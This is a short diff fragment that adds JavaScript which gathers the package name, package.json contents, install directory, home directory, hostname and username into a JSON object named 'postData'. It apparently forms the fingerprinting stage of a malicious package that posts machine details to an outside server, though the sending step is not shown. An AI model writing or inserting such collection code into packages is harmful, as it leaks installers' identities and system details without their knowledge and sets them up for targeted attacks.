@@ -1,0 +1,9 @@
+const postData = JSON.stringify({
+    pkg: pkgName,
+    pkgjson: packageJson,
+    dir: __dirname,
+    home: os.homedir(),
+    host: os.hostname(),
+    username: os.userInfo().username, 
+})
+_tmp_4.host = os.hostname()
